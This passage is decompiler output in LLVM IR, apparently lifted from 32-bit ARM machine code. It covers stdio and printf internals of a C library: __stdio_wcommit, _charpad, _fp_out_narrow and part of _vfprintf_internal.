  %v0_110d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_110d0 = load i32, i32* @r4, align 4
  %v2_110d0 = add i32 %v1_110d0, 24
  %v3_110d0 = inttoptr i32 %v2_110d0 to i32*
  store i32 %v0_110d0, i32* %v3_110d0, align 4
  %v0_110d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_110d4 = load i32, i32* @r4, align 4
  %v2_110d4 = add i32 %v1_110d4, 28
  %v3_110d4 = inttoptr i32 %v2_110d4 to i32*
  store i32 %v0_110d4, i32* %v3_110d4, align 4
  %v0_110d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_110d8 = load i32, i32* @r4, align 4
  %v2_110d8 = add i32 %v1_110d8, 16
  %v3_110d8 = inttoptr i32 %v2_110d8 to i32*
  store i32 %v0_110d8, i32* %v3_110d8, align 4
  br label %dec_label_pc_110dc

dec_label_pc_110dc:                               ; preds = %dec_label_pc_110a0, %dec_label_pc_110b8
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_110e0 = load i32, i32* @r4, align 4
  %v2_110e0 = add i32 %v1_110e0, 52
  %v3_110e0 = inttoptr i32 %v2_110e0 to i32*
  store i32 1, i32* %v3_110e0, align 4
  %v0_110e4 = call i32 @__stdio_init_mutex()
  store i32 %v0_110e4, i32* %r0.global-to-local, align 4
  %v0_110e8 = load i32, i32* @r4, align 4
  %v1_110e8 = add i32 %v0_110e8, 32
  %v2_110e8 = inttoptr i32 %v1_110e8 to i32*
  %storemerge = load i32, i32* %v2_110e8, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_110ec = add i32 %storemerge, 56
  store i32 %v1_110ec, i32* @r5, align 4
  %v2_110f0 = icmp eq i32 %storemerge, 0
  store i32 %v1_110ec, i32* %r0.global-to-local, align 4
  br i1 %v2_110f0, label %dec_label_pc_110ec.dec_label_pc_110fc_crit_edge, label %dec_label_pc_110a0

dec_label_pc_110ec.dec_label_pc_110fc_crit_edge:  ; preds = %dec_label_pc_110dc
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_2b57c.384 to i32*), align 4
  br label %dec_label_pc_110fc

dec_label_pc_110fc:                               ; preds = %dec_label_pc_110ec.dec_label_pc_110fc_crit_edge, %entry
  %v11_1112414 = phi i32 [ %v1_110ec, %dec_label_pc_110ec.dec_label_pc_110fc_crit_edge ], [ %v1_110ec6, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_110ec.dec_label_pc_110fc_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_2b57c.384 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_1111c4 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1111c4, label %dec_label_pc_11124, label %dec_label_pc_11108

dec_label_pc_11108:                               ; preds = %dec_label_pc_110fc, %dec_label_pc_11108
  %v0_11110 = phi i32 [ %storemerge1, %dec_label_pc_11108 ], [ %storemerge12, %dec_label_pc_110fc ]
  %v1_11108 = inttoptr i32 %v0_11110 to i8*
  %v2_11108 = load i8, i8* %v1_11108, align 1
  %v3_11108 = zext i8 %v2_11108 to i32
  store i32 %v3_11108, i32* %r3.global-to-local, align 4
  %v1_1110c = and i32 %v3_11108, 64
  store i32 %v0_11110, i32* %r0.global-to-local, align 4
  store i32 69912, i32* @lr, align 4
  %v1_11114 = icmp ne i32 %v1_1110c, 0
  call void @__pseudo_cond_branch(i1 %v1_11114, i32 ptrtoint (i32* @global_var_11138.591 to i32))
  %v0_11118 = load i32, i32* %r4.global-to-local, align 4
  %v1_11118 = add i32 %v0_11118, 32
  %v2_11118 = inttoptr i32 %v1_11118 to i32*
  %storemerge1 = load i32, i32* %v2_11118, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_1111c = icmp eq i32 %storemerge1, 0
  br i1 %v2_1111c, label %dec_label_pc_1111c.dec_label_pc_11124_crit_edge, label %dec_label_pc_11108

dec_label_pc_1111c.dec_label_pc_11124_crit_edge:  ; preds = %dec_label_pc_11108
  %v11_11124.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11124

dec_label_pc_11124:                               ; preds = %dec_label_pc_1111c.dec_label_pc_11124_crit_edge, %dec_label_pc_110fc
  %v11_11124 = phi i32 [ %v11_11124.pre, %dec_label_pc_1111c.dec_label_pc_11124_crit_edge ], [ %v11_1112414, %dec_label_pc_110fc ]
  %v2_11124 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11124, i32* @r4, align 4
  ret i32 %v11_11124

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 %v1_110ec, { 0, 2, 3, 1 }
  uselistorder i32 %v1_110ec6, { 1, 0, 2, 3 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11108, { 1, 0 }
  uselistorder label %dec_label_pc_110dc, { 1, 0 }
  uselistorder label %dec_label_pc_110a0, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11138 = load i32, i32* @r4, align 4
  store i32 %v3_11138, i32* %stack_var_-8, align 4
  %v0_1113c = load i32, i32* @r0, align 4
  %v1_1113c = add i32 %v0_1113c, 8
  %v2_1113c = inttoptr i32 %v1_1113c to i32*
  %v3_1113c = load i32, i32* %v2_1113c, align 4
  %v1_11140 = add i32 %v0_1113c, 16
  %v2_11140 = inttoptr i32 %v1_11140 to i32*
  %v3_11140 = load i32, i32* %v2_11140, align 4
  %v9_11144 = icmp eq i32 %v3_11140, %v3_1113c
  store i32 %v0_1113c, i32* %r4.global-to-local, align 4
  br i1 %v9_11144, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1113c, i32* %v2_11140, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 69976, i32* @lr, align 4
  %v1_11154 = xor i1 %v9_11144, true
  call void @__pseudo_cond_branch(i1 %v1_11154, i32 ptrtoint (i32* @global_var_14dc0.592 to i32))
  %v0_11158 = load i32, i32* %r4.global-to-local, align 4
  %v1_11158 = add i32 %v0_11158, 8
  %v2_11158 = inttoptr i32 %v1_11158 to i32*
  %v3_11158 = load i32, i32* %v2_11158, align 4
  %v1_1115c = add i32 %v0_11158, 16
  %v2_1115c = inttoptr i32 %v1_1115c to i32*
  %v3_1115c = load i32, i32* %v2_1115c, align 4
  %v2_11160 = sub i32 %v3_1115c, %v3_11158
  %v2_11164 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11164, i32* @r4, align 4
  ret i32 %v2_11160

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_11168 = load i32, i32* @r4, align 4
  %v6_11168 = load i32, i32* @r5, align 4
  %v9_11168 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_111882 = icmp eq i32 %arg3, 0
  %v2_1118c = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_111882, label %dec_label_pc_111a8, label %dec_label_pc_1119c

dec_label_pc_11184:                               ; preds = %dec_label_pc_1119c
  %v1_11184 = add i32 %v0_11184, -1
  store i32 %v1_11184, i32* @r4, align 4
  %v2_11188 = icmp eq i32 %v1_11184, 0
  %v0_11194 = load i32, i32* @r6, align 4
  br i1 %v2_11188, label %dec_label_pc_111a8.loopexit, label %dec_label_pc_1119c

dec_label_pc_1119c:                               ; preds = %entry, %dec_label_pc_11184
  %v0_111944 = phi i32 [ %v0_11194, %dec_label_pc_11184 ], [ %arg1, %entry ]
  %v3_1119c = call i32 @__stdio_fwrite(i32 %v2_1118c, i32 1, i32 %v0_111944)
  %v7_111a0 = icmp eq i32 %v3_1119c, 1
  %v0_11184 = load i32, i32* @r4, align 4
  br i1 %v7_111a0, label %dec_label_pc_11184, label %dec_label_pc_111a8.loopexit

dec_label_pc_111a8.loopexit:                      ; preds = %dec_label_pc_11184, %dec_label_pc_1119c
  %v0_111a8.ph = phi i32 [ %v0_11184, %dec_label_pc_1119c ], [ 0, %dec_label_pc_11184 ]
  %v1_111a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_111a8

dec_label_pc_111a8:                               ; preds = %dec_label_pc_111a8.loopexit, %entry
  %v1_111a8 = phi i32 [ 0, %entry ], [ %v1_111a8.pre, %dec_label_pc_111a8.loopexit ]
  %v0_111a8 = phi i32 [ 0, %entry ], [ %v0_111a8.ph, %dec_label_pc_111a8.loopexit ]
  %v2_111a8 = sub i32 %v1_111a8, %v0_111a8
  store i32 %v3_11168, i32* @r4, align 4
  store i32 %v6_11168, i32* @r5, align 4
  store i32 %v9_11168, i32* @r6, align 4
  ret i32 %v2_111a8

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_111a8.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1119c, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_111b4 = load i32, i32* @r4, align 4
  store i32 %v3_111b4, i32* %stack_var_-24, align 4
  %v9_111b4 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_111bc = and i32 %arg2, 128
  %v2_111bc = icmp eq i32 %v1_111bc, 0
  %v0_111c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_111c0, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_111bc, label %bb, label %dec_label_pc_111d4

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11214

dec_label_pc_111d4:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_111d8 = call i32 @strlen(i8* %arg4)
  store i32 %v3_111d8, i32* %r0.global-to-local, align 4
  %v1_111dc = load i32, i32* %r4.global-to-local, align 4
  %v2_111dc = sub i32 %v1_111dc, %v3_111d8
  store i32 %v2_111dc, i32* @r4, align 4
  store i32 %v3_111d8, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_111dc, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_111f4

.thread:                                          ; preds = %dec_label_pc_111d4
  store i32 %v3_111d8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11214

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111d4
  %v0_111f4 = load i32, i32* @r6, align 4
  %v1_111f4 = urem i32 %v0_111f4, 128
  %v0_111f8 = load i32, i32* @r8, align 4
  store i32 %v0_111f8, i32* %r0.global-to-local, align 4
  %v3_11200 = trunc i32 %v1_111f4 to i8
  %v4_11200 = call i32 @_charpad(i32 %v0_111f8, i8 %v3_11200, i32 %v2_111dc)
  store i32 %v4_11200, i32* %r0.global-to-local, align 4
  %v1_11204 = load i32, i32* @r4, align 4
  %v9_11204 = icmp eq i32 %v4_11200, %v1_11204
  store i32 %v4_11200, i32* %r6.global-to-local, align 4
  br i1 %v9_11204, label %dec_label_pc_11210, label %dec_label_pc_11230

dec_label_pc_11210:                               ; preds = %dec_label_pc_111f4
  %v0_11210 = load i32, i32* @r5, align 4
  store i32 %v0_11210, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11214

dec_label_pc_11214:                               ; preds = %bb, %.thread, %dec_label_pc_11210
  %v5_11220 = phi i32 [ %v0_11210, %dec_label_pc_11210 ], [ %arg3, %bb ], [ %v3_111d8, %.thread ]
  %tmp17 = icmp slt i32 %v5_11220, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_11214
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_11214
  %v5_1121c = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_1121c, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_14e7c.593 to i32))
  %v0_1122c = load i32, i32* %r6.global-to-local, align 4
  %v2_1122c = add i32 %storemerge, %v0_1122c
  store i32 %v2_1122c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11230

dec_label_pc_11230:                               ; preds = %dec_label_pc_111f4, %bb19
  %v0_11230 = phi i32 [ %v4_11200, %dec_label_pc_111f4 ], [ %v2_1122c, %bb19 ]
  store i32 %v0_11230, i32* %r0.global-to-local, align 4
  %v2_11234 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11234, i32* %r4.global-to-local, align 4
  store i32 %v9_111b4, i32* %r6.global-to-local, align 4
  ret i32 %v0_11230

; uselistorder directives
  uselistorder i32 %v0_11230, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_11230, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_11214, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11238 = load i32, i32* @r4, align 4
  store i32 %v3_11238, i32* %stack_var_-36, align 4
  %v6_11238 = load i32, i32* @r5, align 4
  %v15_11238 = load i32, i32* @r8, align 4
  %v18_11238 = load i32, i32* @sb, align 4
  %v21_11238 = load i32, i32* @sl, align 4
  %v24_11238 = load i32, i32* @fp, align 4
  %v2_11240 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_11240, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_11240, i32* %r0.global-to-local, align 4
  %v0_1124c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1124c, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_11254 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_11254, i32* %r0.global-to-local, align 4
  %v1_11258 = icmp slt i32 %v2_11254, 0
  br i1 %v1_11258, label %dec_label_pc_11260, label %dec_label_pc_11294

dec_label_pc_11260:                               ; preds = %entry
  %v3_11260 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_11260, i32* @r4, align 4
  %v1_11264 = inttoptr i32 %v3_11260 to i8*
  store i32 %v3_11260, i32* %r0.global-to-local, align 4
  %v3_11268 = call i32 @strlen(i8* %v1_11264)
  store i32 %v3_11268, i32* %r0.global-to-local, align 4
  %v2_1126c = icmp eq i32 %v3_11268, 0
  br i1 %v2_1126c, label %bb, label %dec_label_pc_1127c

bb:                                               ; preds = %dec_label_pc_11260
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1180c

dec_label_pc_1127c:                               ; preds = %dec_label_pc_11260
  %v0_1127c = load i32, i32* @r4, align 4
  store i32 %v0_1127c, i32* %r0.global-to-local, align 4
  %v0_11280 = load i32, i32* @fp, align 4
  store i32 %v0_11280, i32* %r2.global-to-local, align 4
  %v3_11284 = call i32 @__stdio_fwrite(i32 %v0_1127c, i32 %v3_11268, i32 %v0_11280)
  store i32 %v3_11284, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1180c

dec_label_pc_11294:                               ; preds = %entry
  store i32 %v2_11240, i32* %r0.global-to-local, align 4
  %v0_11298 = load i32, i32* @r5, align 4
  %v2_1129c = call i32 @_ppfs_prepargs(i32 %v2_11240, i32 %v0_11298)
  store i32 %v2_1129c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_1133c = zext i8 %tmp104 to i32
  %v2_11344 = ptrtoint i32* %stack_var_-252 to i32
  %v2_11364 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1137c = icmp eq i32 %tmp102, 0
  %v1_11390 = inttoptr i32 %tmp101 to i32*
  %v2_11680 = ptrtoint i32* %stack_var_-180 to i32
  %v2_1159c = ptrtoint i32* %stack_var_-44 to i32
  %v2_115b0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1154c = add i32 %tmp101, 4
  %v4_1154c = inttoptr i32 %v3_1154c to i32*
  %v2_11550 = ptrtoint i32* %stack_var_-328 to i32
  %v7_11410 = zext i8 %tmp99 to i32
  %v2_1144c = ptrtoint i32* %stack_var_-53 to i32
  %v5_11454 = bitcast i32* %stack_var_-53 to i8*
  %v2_1145c = icmp ugt i32 %tmp102, 4
  %v7_1145c = icmp eq i32 %tmp102, 5
  %v0_117f4.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_11374187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_11570 = icmp ugt i32 %tmp102, 16
  %v7_11570 = icmp eq i32 %tmp102, 17
  %v2_11574 = xor i1 %v7_11570, true
  %v3_11574 = and i1 %v2_11570, %v2_11574
  %v2_11610 = icmp ugt i32 %tmp102, 18
  %v7_11610 = icmp eq i32 %tmp102, 19
  %v2_11614 = xor i1 %v7_11610, true
  %v3_11614 = and i1 %v2_11610, %v2_11614
  %v7_11674 = icmp eq i32 %tmp102, 20
  %v2_113b4 = add i32 %tmp102, ptrtoint (i32* @global_var_1d65c.595 to i32)
  %v1_113b8 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_1d65c.595 to i32), i32 -1)
  %v2_113b8 = inttoptr i32 %v1_113b8 to i8*
  %v2_113e4 = xor i1 %v7_1145c, true
  %v3_113e4 = and i1 %v2_1145c, %v2_113e4
  %v7_11418 = icmp eq i32 %tmp102, 1
  %v2_11464 = xor i1 %v2_1145c, true
  %v3_11464 = or i1 %v7_1145c, %v2_11464
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_114cc = icmp eq i32 %tmp102, 3
  %v11_114d8 = icmp eq i32 %tmp102, 4
  %v9_11348 = mul nuw nsw i32 %v4_1133c, 8
  %v10_11348 = add nsw i32 %v9_11348, -8
  %v6_11350 = add i32 %v10_11348, %v2_11344
  br label %dec_label_pc_117f4

bb126:                                            ; preds = %dec_label_pc_112ac.outer, %.thread7
  %v2_112ac185 = phi i8 [ %v2_112ac, %.thread7 ], [ %v2_112ac181, %dec_label_pc_112ac.outer ]
  %v1_112c0184 = phi i32 [ %v2_112c0, %.thread7 ], [ %v0_112ac49, %dec_label_pc_112ac.outer ]
  %v8_112b4 = icmp eq i8 %v2_112ac185, 37
  br i1 %v8_112b4, label %dec_label_pc_112c8, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_112c0 = add i32 %v1_112c0184, 1
  store i32 %v2_112c0, i32* @r4, align 4
  %v1_112ac = inttoptr i32 %v2_112c0 to i8*
  %v2_112ac = load i8, i8* %v1_112ac, align 1
  %v3_112ac = zext i8 %v2_112ac to i32
  store i32 %v3_112ac, i32* %r3.global-to-local, align 4
  %v2_112b0 = icmp eq i8 %v2_112ac, 0
  br i1 %v2_112b0, label %dec_label_pc_112c8, label %bb126

dec_label_pc_112c8:                               ; preds = %bb126, %.thread7, %dec_label_pc_112ac.outer
  %v1_112c0.lcssa = phi i32 [ %v0_112ac49, %dec_label_pc_112ac.outer ], [ %v2_112c0, %.thread7 ], [ %v1_112c0184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_112c8 = sub i32 %v1_112c0.lcssa, %v5_112d8
  %v9_112c8 = icmp eq i32 %v1_112c0.lcssa, %v5_112d8
  br i1 %v9_112c8, label %dec_label_pc_112fc, label %dec_label_pc_112d0

dec_label_pc_112d0:                               ; preds = %dec_label_pc_112c8
  store i32 %v2_112c8, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_112c8, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_112d0
  store i32 %v5_112d8, i32* %r0.global-to-local, align 4
  %v5_112e0 = load i32, i32* @fp, align 4
  store i32 %v5_112e0, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_112d0, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_112d0 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_14e7c.593 to i32))
  %v0_112e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_112e8 = load i32, i32* @r5, align 4
  %v9_112e8 = icmp eq i32 %v0_112e8, %v1_112e8
  br i1 %v9_112e8, label %dec_label_pc_112f0, label %dec_label_pc_11804

dec_label_pc_112f0:                               ; preds = %bb130
  %v2_112f4 = add i32 %v0_112e8, %stack_var_-336.1.ph
  %v0_112fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_112fc

dec_label_pc_112fc:                               ; preds = %dec_label_pc_112c8, %dec_label_pc_112f0
  %v0_11310 = phi i32 [ %v5_112d8, %dec_label_pc_112c8 ], [ %v0_112fc.pre, %dec_label_pc_112f0 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_112c8 ], [ %v2_112f4, %dec_label_pc_112f0 ]
  %v1_112fc = inttoptr i32 %v0_11310 to i8*
  %v2_112fc = load i8, i8* %v1_112fc, align 1
  %v3_112fc = zext i8 %v2_112fc to i32
  store i32 %v3_112fc, i32* %r3.global-to-local, align 4
  %v2_11300 = icmp eq i8 %v2_112fc, 0
  br i1 %v2_11300, label %dec_label_pc_1180c, label %dec_label_pc_11308

dec_label_pc_11308:                               ; preds = %dec_label_pc_112fc
  %v1_11308 = add i32 %v0_11310, 1
  %v2_11308 = inttoptr i32 %v1_11308 to i8*
  %v3_11308 = load i8, i8* %v2_11308, align 1
  %v4_11308 = zext i8 %v3_11308 to i32
  store i32 %v4_11308, i32* %r3.global-to-local, align 4
  %v7_1130c = icmp eq i8 %v3_11308, 37
  store i32 %v1_11308, i32* %r2.global-to-local, align 4
  br i1 %v7_1130c, label %dec_label_pc_117fc, label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_11308
  store i32 %v2_11240, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_11240, i32* %r0.global-to-local, align 4
  store i32 %v1_11308, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_1132c = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_11240, i32* @r0, align 4
  %v0_11334 = call i32 @_ppfs_setargs()
  store i32 %v0_11334, i32* %r0.global-to-local, align 4
  store i32 %v4_1133c, i32* %ip.global-to-local, align 4
  store i32 %v2_11344, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_11318
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_11318
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_11350, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_1135c78 = phi i32 [ %v6_11350, %bb133 ], [ %v2_11344, %.thread ]
  store i32 %v2_11364, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_11374187, label %dec_label_pc_1135c, label %dec_label_pc_11378

dec_label_pc_1135c:                               ; preds = %bb134, %dec_label_pc_1135c
  %v5_1136c189 = phi i32 [ %v5_1136c, %dec_label_pc_1135c ], [ %v2_11364, %bb134 ]
  %v0_1135c188 = phi i32 [ %v1_11360, %dec_label_pc_1135c ], [ %v0_1135c78, %bb134 ]
  %v2_1135c = add i32 %v5_1136c189, -4
  %v3_1135c = inttoptr i32 %v2_1135c to i32*
  store i32 %v0_1135c188, i32* %v3_1135c, align 4
  %v0_11360 = load i32, i32* %r3.global-to-local, align 4
  %v1_11360 = add i32 %v0_11360, 8
  store i32 %v1_11360, i32* %r3.global-to-local, align 4
  %v0_11368.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11368.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_11364, i32* @lr, align 4
  %v4_1136c = mul i32 %v0_11368.pre, 4
  %v5_1136c = add i32 %v4_1136c, %v2_11364
  %v1_11370 = add i32 %v0_11368.pre, 1
  store i32 %v1_11370, i32* %r2.global-to-local, align 4
  %v5_11374 = icmp slt i32 %v0_11368.pre, %v1_11368.pre
  br i1 %v5_11374, label %dec_label_pc_1135c, label %dec_label_pc_11378

dec_label_pc_11378:                               ; preds = %dec_label_pc_1135c, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_1137c, label %dec_label_pc_11384, label %dec_label_pc_113a8

dec_label_pc_11384:                               ; preds = %dec_label_pc_11378
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_11390 = load i32, i32* %v1_11390, align 4
  store i32 %v2_11390, i32* %r0.global-to-local, align 4
  %v1_11394 = and i32 %v0_113d8, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_1139c = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_1139c, i32* %r3.global-to-local, align 4
  %v4_113a0 = inttoptr i32 %v2_11390 to i8*
  %v5_113a0 = call i32 @_store_inttype(i8* %v4_113a0, i32 %v1_11394, i32 %stack_var_-336.2, i32 %v3_1139c)
  store i32 %v5_113a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_117f0

dec_label_pc_113a8:                               ; preds = %dec_label_pc_11378
  br i1 %tmp195, label %dec_label_pc_11534, label %dec_label_pc_113b0

dec_label_pc_113b0:                               ; preds = %dec_label_pc_113a8
  store i32 %v2_113b4, i32* %r3.global-to-local, align 4
  %v3_113b8 = load i8, i8* %v2_113b8, align 1
  %v4_113b8 = zext i8 %v3_113b8 to i32
  store i32 %v4_113b8, i32* @r4, align 4
  %v7_113bc = icmp eq i8 %v3_113b8, 10
  br i1 %v7_113bc, label %dec_label_pc_113c8, label %bb135

bb135:                                            ; preds = %dec_label_pc_113b0
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_113c8:                               ; preds = %dec_label_pc_113b0
  store i32 %v0_113d8, i32* %r3.global-to-local, align 4
  %v1_113cc = and i32 %v0_113d8, 32
  %v2_113cc = icmp eq i32 %v1_113cc, 0
  %.175 = select i1 %v2_113cc, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_113d8 = and i32 %v0_113d8, 64
  %v2_113d8 = icmp eq i32 %v1_113d8, 0
  br i1 %v2_113d8, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_113c8
  %.176 = select i1 %v2_113cc, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_113c8, %bb138
  br i1 %v3_113e4, label %.thread84, label %dec_label_pc_113ec

.thread84:                                        ; preds = %bb139
  %v5_113e4 = sub nsw i32 0, %v4_113b8
  store i32 %v5_113e4, i32* @r4, align 4
  br label %dec_label_pc_11404

dec_label_pc_113ec:                               ; preds = %bb139
  br i1 %v7_114cc, label %bb140, label %dec_label_pc_113f8

bb140:                                            ; preds = %dec_label_pc_113ec
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_11404

dec_label_pc_113f8:                               ; preds = %dec_label_pc_113ec
  br i1 %v7_11418, label %dec_label_pc_11408, label %dec_label_pc_11404

dec_label_pc_11404:                               ; preds = %.thread84, %bb140, %dec_label_pc_113f8
